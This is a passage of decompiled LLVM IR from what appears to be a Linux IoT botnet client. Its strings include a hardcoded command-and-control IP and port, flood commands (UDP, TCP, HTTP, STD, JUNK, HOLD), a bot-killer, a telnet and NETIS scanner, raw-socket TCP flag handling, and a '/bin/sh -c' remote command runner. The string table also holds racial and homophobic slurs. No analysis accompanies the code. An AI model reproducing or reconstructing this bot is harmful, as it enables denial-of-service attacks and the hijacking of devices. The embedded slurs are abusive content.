i8]* @global_var_805c29c.808, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805c2e4.809, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_805c334.810, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805c384.811, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_805c3b8.812, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_805c3ec.813, i32 0, i32 0)]
@global_var_805c550.818 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_805c58e.819 = constant [6 x i8] c"arfgG\00"
@global_var_805c594.820 = constant [9 x i8] c"HBiug655\00"
@global_var_805c59d.821 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_805c5aa.822 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_805c5be.823 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_805c5cf.824 = constant [12 x i8] c"GJjyur67458\00"
@global_var_805c5db.825 = constant [12 x i8] c"RYSDk747586\00"
@global_var_805c5e7.826 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_805c5f3.827 = constant [10 x i8] c"KHGK7985i\00"
@global_var_805c5fd.828 = constant [11 x i8] c"yuituiILYF\00"
@global_var_805c608.829 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_805c616.830 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_805c622.831 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_805c62f.832 = constant [9 x i8] c"ewqdcftr\00"
@global_var_805c638.833 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_805c648.834 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_805c653.835 = constant [12 x i8] c"twehgbferhb\00"
@global_var_805c65f.836 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_805c66b.837 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_805c679.838 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_805c687.839 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_805c695.840 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_805c69f.841 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_805c6ad.842 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_805c6bb.843 = constant [12 x i8] c"yteytietyue\00"
@global_var_805c6c7.844 = constant [9 x i8] c"qsortEQS\00"
@global_var_805c6d0.845 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_805c6e0.846 = constant [4 x i8] c"std\00"
@global_var_805c6e4.847 = constant [4 x i8] c"dts\00"
@global_var_805c6e8.848 = constant [6 x i8] c"hackz\00"
@global_var_805c6ee.849 = constant [7 x i8] c"shdyed\00"
@global_var_805c6f5.850 = constant [5 x i8] c"http\00"
@global_var_805c6fa.851 = constant [10 x i8] c"sghwiondc\00"
@global_var_805c704.852 = constant [7 x i8] c"nigger\00"
@global_var_805c70b.853 = constant [6 x i8] c"pussy\00"
@global_var_805c711.854 = constant [7 x i8] c"faggot\00"
@global_var_805c720.855 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805c58e.819, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805c594.820, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805c59d.821, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_805c5aa.822, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805c5be.823, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c5cf.824, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c5db.825, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c5e7.826, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805c5f3.827, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805c5fd.828, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805c608.829, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c616.830, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805c622.831, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805c62f.832, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805c638.833, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805c648.834, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c653.835, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c65f.836, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805c66b.837, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805c679.838, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805c687.839, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805c695.840, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805c69f.841, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805c6ad.842, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805c6bb.843, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805c6c7.844, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805c6d0.845, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c6e0.846, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805c6e4.847, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805c6e8.848, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805c6ee.849, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805c6f5.850, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805c6fa.851, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805c704.852, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805c70b.853, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805c711.854, i32 0, i32 0)]
@global_var_805c7b0.856 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_805c7cc.857 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_805c7ed.858 = constant [4 x i8] c"all\00"
@global_var_805c7f1.859 = constant i32 2037579820
@global_var_805c7f3.860 = constant [4 x i8] c"syn\00"
@global_var_805c7f7.861 = constant [4 x i8] c"rst\00"
@global_var_805c7fb.862 = constant [4 x i8] c"fin\00"
@global_var_805c7ff.863 = constant [4 x i8] c"ack\00"
@global_var_805c803.864 = constant [4 x i8] c"psh\00"
@global_var_805c807.865 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_805c819.866 = constant [6 x i8] c"PONG!\00"
@global_var_805c81f.867 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_805c82a.868 = constant [10 x i8] c"My IP: %s\00"
@global_var_805c834.869 = constant [8 x i8] c"BOTKILL\00"
@global_var_805c83c.870 = constant [13 x i8] c"Killing Bots\00"
@global_var_805c849.871 = constant [7 x i8] c"LOOPME\00"
@global_var_805c850.872 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_805c860.873 = constant [7 x i8] c"TELNET\00"
@global_var_805c867.874 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_805c877.875 = constant [4 x i8] c"OFF\00"
@global_var_8065b50.876 = local_unnamed_addr global i32 0
@global_var_805c87b.877 = constant [5 x i8] c" OFF\00"
@global_var_805c880.878 = constant [3 x i8] c"ON\00"
@global_var_805c883.879 = constant [6 x i8] c"NETIS\00"
@global_var_805c889.880 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_805c8a2.881 = constant [5 x i8] c"HOLD\00"
@global_var_805c8a7.882 = constant [5 x i8] c"JUNK\00"
@global_var_805c8ac.883 = constant [4 x i8] c"UDP\00"
@global_var_805c8b0.884 = constant [5 x i8] c"HTTP\00"
@global_var_805c8b5.885 = constant [4 x i8] c"CNC\00"
@global_var_805c8b9.886 = constant [6 x i8] c"COMBO\00"
@global_var_805c8bf.887 = constant [4 x i8] c"STD\00"
@global_var_805c8c3.888 = constant [4 x i8] c"TCP\00"
@global_var_805c8c7.889 = constant [5 x i8] c"STOP\00"
@global_var_805c8cc.890 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_805f590.891 = local_unnamed_addr global i32 -1
@global_var_8057f80.892 = constant [15 x i8] c"191.96.249.102\00"
@global_var_805f420.893 = global [15 x i8]* @global_var_8057f80.892
@global_var_805f424.894 = local_unnamed_addr global i32 987
@global_var_805c8d8.895 = constant [8 x i8] c"8.8.8.8\00"
@global_var_805c8e0.896 = constant [16 x i8] c"/proc/net/route\00"
@global_var_805c8f0.897 = constant [11 x i8] c"\0900000000\09\00"
@global_var_805c8fb.899 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_805c90b.900 = constant [7 x i8] c"SERVER\00"
@global_var_805c912.901 = constant [7 x i8] c"ROUTER\00"
@global_var_805c91a.903 = constant [5 x i8] c"sshd\00"
@global_var_805c91f.904 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_805f58c.905 = local_unnamed_addr global i32 1
@global_var_805c932.906 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_805c93f.907 = constant i32 1331036207
@global_var_805c941.908 = constant [9 x i8] c"VOIDV1.0\00"
@global_var_805c94c.909 = constant i32 993090331
@global_var_805c9c8.910 = constant [5 x i8] c"PONG\00"
@global_var_805c9cd.911 = constant [4 x i8] c"DUP\00"
@global_var_805c9d1.912 = constant [8 x i8] c"%s 2>&1\00"
@global_var_805c9d9.913 = constant i32 2097266
@global_var_805c9db.914 = constant i32 32
@global_var_805f61c = external local_unnamed_addr global i32
@global_var_805f680.917 = global i32 288
@global_var_805f6d0.918 = local_unnamed_addr global i32 272
@global_var_8065b20.920 = global i32 0
@global_var_805cfe0.921 = constant i32 0
@global_var_805f640.922 = global i32 0
@global_var_805f658.923 = global i32 0
@global_var_805f63c.924 = global i32* @global_var_805f680.917
@global_var_805cff8.925 = constant [6 x i8] c"(nil)\00"
@global_var_805cffe.926 = constant [7 x i8] c"(null)\00"
@global_var_805d005.927 = constant i32 2949163
@global_var_805d072.929 = constant i32 327688
@global_var_805d06a.930 = constant [8 x i8] c" +0-#'I\00"
@global_var_805d018.931 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805d055.932 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805d04b.933 = constant i32 117506048
@global_var_805d03c.934 = constant i32 331776
@global_var_805d0c0.935 = constant [8 x i8] c"Success\00"
@global_var_805d096.936 = constant [15 x i8] c"Unknown error \00"
@global_var_805e060.937 = constant i32 65536
@global_var_805f880.938 = local_unnamed_addr global i32* @global_var_805e060.937
@global_var_8065900.939 = global i32 0
@global_var_805dc9c.940 = constant [15 x i8] c"Resolver error\00"
@global_var_805dc22.941 = constant [8 x i8] c"Error 0\00"
@global_var_805dc2a.942 = constant [13 x i8] c"Unknown host\00"
@global_var_805dc37.943 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_805dc50.944 = constant [21 x i8] c"Unknown server error\00"
@global_var_805dc65.945 = constant [32 x i8] c"No address associated with name\00"
@global_var_805dc88.946 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805dc22.941, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805dc2a.942, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_805dc37.943, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805dc50.944, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805dc65.945, i32 0, i32 0)]
@global_var_805dcab.947 = constant [3 x i8] c": \00"
@global_var_805dcad.948 = constant i32 0
@global_var_805dc1a.949 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_8065904.950 = global i32 0
@global_var_8065920.951 = global i32 0
@global_var_8065aec.952 = global i32 0
@global_var_805f888.953 = global i32 0
@global_var_8065f74.954 = local_unnamed_addr global i32 0
@global_var_8065f68.955 = global i32 0
@global_var_8065b60.956 = global i32 0
@global_var_805f770.957 = global i32 0
@global_var_8065c0c.959 = global i32 0
@global_var_8065c10.960 = local_unnamed_addr global i32 0
@global_var_8065c14.961 = global i32 0
@global_var_8065c20.962 = local_unnamed_addr global i32 0
@global_var_8065f14.963 = global i32 0
@global_var_8065f3c.964 = local_unnamed_addr global i32 0
@global_var_8065f2c.965 = local_unnamed_addr global i32 0
@global_var_8065f30.966 = local_unnamed_addr global i32 0
@global_var_8065f34.967 = local_unnamed_addr global i32 0
@global_var_8065f38.968 = local_unnamed_addr global i32 0
@global_var_8065f44.969 = local_unnamed_addr global i32 0
@global_var_8065f50.970 = local_unnamed_addr global i32 0
@global_var_8065f48.971 = local_unnamed_addr global i32 0
@global_var_8065f54.972 = local_unnamed_addr global i32 0
@global_var_8065f28.973 = local_unnamed_addr global i32 0
@global_var_8065f24.975 = local_unnamed_addr global i32 0
@global_var_8065f4c.976 = local_unnamed_addr global i32 0
@global_var_8065c1c.977 = local_unnamed_addr global i32 0
@global_var_805f788.978 = global i32 0
@global_var_805f7a0.980 = global i32 0
@global_var_805f7b8 = external global i32
@global_var_805f7e4.982 = global i32 -1726662223
@global_var_805f7c0.983 = local_unnamed_addr global i32* @global_var_805f7e4.982
@global_var_805f7bc.984 = global i32* @global_var_805f7e4.982
@global_var_805dcd4.985 = constant i32 0
@global_var_805dcc0.986 = constant i32 0
@global_var_805dce8.987 = constant [3 x i8] c"-c\00"
@global_var_805dcf0.988 = constant [3 x i8] c"sh\00"
@global_var_805dceb.989 = constant [8 x i8] c"/bin/sh\00"
@global_var_805f860.990 = global i32 0
@global_var_8065b04.991 = local_unnamed_addr global i32 0
@global_var_8065b0c.992 = local_unnamed_addr global i32 0
@global_var_805f3c8.994 = global i32 -1
@global_var_8054a27.995 = constant i32 -294069
@global_var_8065b14.996 = local_unnamed_addr global i32 0
@global_var_8065b18.997 = local_unnamed_addr global i32 0
@global_var_805df4c.998 = constant [10 x i8] c"/dev/null\00"
@global_var_8065b10.1000 = local_unnamed_addr global i32 0
@global_var_8065b08.1001 = local_unnamed_addr global i32 0
@global_var_8054c0d.1003 = constant i32 1928542531
@global_var_8054c31.1004 = constant i32 1928542531
@global_var_8065b44.1005 = local_unnamed_addr global i32 0
@global_var_8065b24.1006 = global i32 0
@global_var_805e270.1008 = constant [4 x i8] c"inf\00"
@global_var_805e273.1013 = constant i32 1179535616
@global_var_805e280.1014 = constant i32 2883630
@global_var_8065f78.1018 = local_unnamed_addr global i32 0
@global_var_805e33c.1019 = constant i32 1697579054
@global_var_805e370.1020 = constant i32 1868824690
@global_var_805e33e.1021 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805e34f.1022 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805e367.1023 = constant [11 x i8] c"nameserver\00"
@global_var_805e372.1024 = constant [7 x i8] c"domain\00"
@global_var_805e379.1025 = constant [7 x i8] c"search\00"
@global_var_8065f58.1026 = global i32 0
@global_var_8065f7c.1027 = local_unnamed_addr global i32 0
@global_var_8065f80.1028 = local_unnamed_addr global i32 0
@global_var_80638e4.1029 = local_unnamed_addr global i32 0
@global_var_80638e8.1030 = local_unnamed_addr global i32 0
@global_var_805f670.1031 = local_unnamed_addr global i32 2
@global_var_805e394.1032 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_805e391.1034 = constant [3 x i8] c"%x\00"
@global_var_805e3a5.1035 = constant [11 x i8] c"/etc/hosts\00"
@global_var_805e3b0.1036 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_805f8a0.1 = local_unnamed_addr global i8 0
@global_var_80638e0.13 = external local_unnamed_addr global i8*
@global_var_805f8d7.27 = local_unnamed_addr global i8 0
@global_var_805f8d8.28 = local_unnamed_addr global i8 0
@global_var_805f8d9.29 = local_unnamed_addr global i8 0
@global_var_805f8da.30 = local_unnamed_addr global i8 0
@global_var_805f8d6.230 = local_unnamed_addr global i8 0
@global_var_8065b48.232 = external local_unnamed_addr global i8*
@global_var_805f8d0.898 = external global i8*
@global_var_805c919.902 = external constant i8*
@global_var_805d08a.928 = external constant i8*
@global_var_8065be0.958 = global i8 0
@global_var_8065f40.974 = local_unnamed_addr global i8 0
@global_var_8065b00.979 = local_unnamed_addr global i8 0
@global_var_8065b1c.999 = local_unnamed_addr global i8 0
@global_var_8065b28.1015 = external global i8*
@global_var_8065b40.1016 = local_unnamed_addr global i64 0
@global_var_805f884.1017 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @__get_pc_thunk_bx(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 95039
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @frame_dummy()
  %v0_80480a8 = call i32 @__do_global_ctors_aux()
  ret i32 %v0_80480a8
}

define i32 @__get_pc_thunk_bx(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_80480c6 = load i8, i8* @global_var_805f8a0.1, align 32
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %entry.dec_label_pc_8048106_crit_edge

entry.dec_label_pc_8048106_crit_edge:             ; preds = %entry
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %entry
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_805f404.3 to i32*), align 4
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e49 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e49, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_805f404.3 to i32*), align 4
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_805f404.3 to i32*), align 4
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_805f8a0.1, align 32
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %entry.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %entry.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805f404.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_805f8a0.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_805e3c4.4 to i32))
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* @global_var_805f3d8.6, align 8
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @_start(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @ebp, align 4
  store i32 %arg1, i32* @esi, align 4
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v9_8048180 = call i32 @__uClibc_main(i32 134548398, i32 %arg1, i32* nonnull %stack_var_4, i32 134512788, i32 134578024, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  ret i32 %v9_8048180

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @global_var_805f8e0.7, align 32
  %v1_8048199 = add i32 %arg1, -1640531527
  store i32 %v1_8048199, i32* @global_var_805f8e4.8, align 4
  %v1_80481a6 = add i32 %arg1, 1013904242
  store i32 %v1_80481a6, i32* %eax.global-to-local, align 4
  store i32 %v1_80481a6, i32* @global_var_805f8e8.9, align 8
  br label %dec_label_pc_80481b9

dec_label_pc_80481b9:                             ; preds = %entry, %dec_label_pc_80481b9
  %storemerge5 = phi i32 [ 3, %entry ], [ %v4_80481e9, %dec_label_pc_80481b9 ]
  %v1_80481bf = add nsw i32 %storemerge5, -3
  store i32 %v1_80481bf, i32* %eax.global-to-local, align 4
  %v1_80481c2 = mul nuw nsw i32 %v1_80481bf, 4
  %v2_80481c2 = add i32 %v1_80481c2, ptrtoint (i32* @global_var_805f8e0.7 to i32)
  %v3_80481c2 = inttoptr i32 %v2_80481c2 to i32*
  %v4_80481c2 = load i32, i32* %v3_80481c2, align 4
  %v1_80481cc = add nsw i32 %storemerge5, -2
  store i32 %v1_80481cc, i32* %eax.global-to-local, align 4
  %v1_80481cf = mul nuw nsw i32 %v1_80481cc, 4
  %v2_80481cf = add i32 %v1_80481cf, ptrtoint (i32* @global_var_805f8e0.7 to i32)
  %v3_80481cf = inttoptr i32 %v2_80481cf to i32*
  %v4_80481cf = load i32, i32* %v3_80481cf, align 4
  %v2_80481d6 = xor i32 %v4_80481cf, %v4_80481c2
  %v2_80481db = xor i32 %storemerge5, -1640531527
  %v1_80481dd = xor i32 %v2_80481db, %v2_80481d6
  store i32 %v1_80481dd, i32* %eax.global-to-local, align 4
  %v2_80481e2 = mul nuw nsw i32 %storemerge5, 4
  %v3_80481e2 = add i32 %v2_80481e2, ptrtoint (i32* @global_var_805f8e0.7 to i32)
  %v4_80481e2 = inttoptr i32 %v3_80481e2 to i32*
  store i32 %v1_80481dd, i32* %v4_80481e2, align 4
  %v4_80481e9 = add nuw nsw i32 %storemerge5, 1
  %exitcond = icmp eq i32 %v4_80481e9, 4096
  br i1 %exitcond, label %dec_label_pc_80481f5, label %dec_label_pc_80481b9

dec_label_pc_80481f5:                             ; preds = %dec_label_pc_80481b9
  %v0_80481f6 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80481f6

; uselistorder directives
  uselistorder i32 %storemerge5, { 2, 3, 4, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80481b9, { 1, 0 }
}

define i32 @rand_cmwc(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048213 = load i32, i32* @global_var_805f598.10, align 8
  %v1_8048218 = add i32 %v0_8048213, 1
  %v1_8048219 = urem i32 %v1_8048218, 4096
  store i32 %v1_8048219, i32* @global_var_805f598.10, align 8
  %v1_8048228 = mul nuw nsw i32 %v1_8048219, 4
  %v2_8048228 = add i32 %v1_8048228, ptrtoint (i32* @global_var_805f8e0.7 to i32)
  %v3_8048228 = inttoptr i32 %v2_8048228 to i32*
  %v4_8048228 = load i32, i32* %v3_8048228, align 4
  %v7_8048245 = udiv i32 %v4_8048228, 228675
  store i32 %v7_8048245, i32* @global_var_805f594.11, align 4
  br i1 true, label %dec_label_pc_8048295, label %dec_label_pc_8048287

dec_label_pc_8048287:                             ; preds = %entry
  br label %dec_label_pc_8048295

dec_label_pc_8048295:                             ; preds = %entry, %dec_label_pc_8048287
  store i32 %v1_8048219, i32* @ecx, align 4
  %v1_80482aa = mul nuw nsw i32 %v1_8048219, 4
  %v2_80482aa = add i32 %v1_80482aa, ptrtoint (i32* @global_var_805f8e0.7 to i32)
  %v3_80482aa = inttoptr i32 %v2_80482aa to i32*
  %v4_80482aa = load i32, i32* %v3_80482aa, align 4
  ret i32 %v4_80482aa

; uselistorder directives
  uselistorder i32 %v1_8048219, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8048295, { 1, 0 }
}

define i32 @trim() local_unnamed_addr {
entry:
  %tmp10 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80482ba = load i32, i32* @edi, align 4
  store i32 %v0_80482ba, i32* %stack_var_-8, align 4
  %v4_80482c5 = ptrtoint i8* %tmp10 to i32
  store i1 false, i1* @df, align 1
  %v3_80482d6 = call i32 @_strlen(i8* %tmp10)
  %v1_80482dd = add i32 %v3_80482d6, -1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e3:                             ; preds = %dec_label_pc_80482e6
  %v4_80482e3 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_80482e6

dec_label_pc_80482e6:                             ; preds = %entry, %dec_label_pc_80482e3
  %stack_var_-16.0 = phi i32 [ 0, %entry ], [ %v4_80482e3, %dec_label_pc_80482e3 ]
  %v6_80482e9 = add i32 %stack_var_-16.0, %v4_80482c5
  %v1_80482ec = inttoptr i32 %v6_80482e9 to i8*
  %v2_80482ec = load i8, i8* %v1_80482ec, align 1
  %v2_80482ee = sext i8 %v2_80482ec to i32
  %v1_80482f5 = call i32 @isspace(i32 %v2_80482ee)
  %v1_80482fd = icmp eq i32 %v1_80482f5, 0
  %v1_80482ff = icmp eq i1 %v1_80482fd, false
  br i1 %v1_80482ff, label %dec_label_pc_80482e3, label %dec_label_pc_8048306.preheader

dec_label_pc_8048306.preheader:                   ; preds = %dec_label_pc_80482e6
  %v5_804830c24 = icmp slt i32 %v1_80482dd, %stack_var_-16.0
  br i1 %v5_804830c24, label %dec_label_pc_8048329, label %dec_label_pc_804830e.lr.ph

dec_label_pc_804830e.lr.ph:                       ; preds = %dec_label_pc_8048306.preheader
  br label %dec_label_pc_804830e

dec_label_pc_8048303:                             ; preds = %dec_label_pc_804830e
  %v5_8048303 = add i32 %stack_var_-12.0.in25, -1
  %v5_804830c = icmp slt i32 %v5_8048303, %stack_var_-16.0
  br i1 %v5_804830c, label %dec_label_pc_8048329, label %dec_label_pc_804830e

dec_label_pc_804830e:                             ; preds = %dec_label_pc_804830e.lr.ph, %dec_label_pc_8048303
  %stack_var_-12.0.in25 = phi i32 [ %v1_80482dd, %dec_label_pc_804830e.lr.ph ], [ %v5_8048303, %dec_label_pc_8048303 ]
  %v6_8048311 = add i32 %stack_var_-12.0.in25, %v4_80482c5
  %v1_8048314 = inttoptr i32 %v6_8048311 to i8*
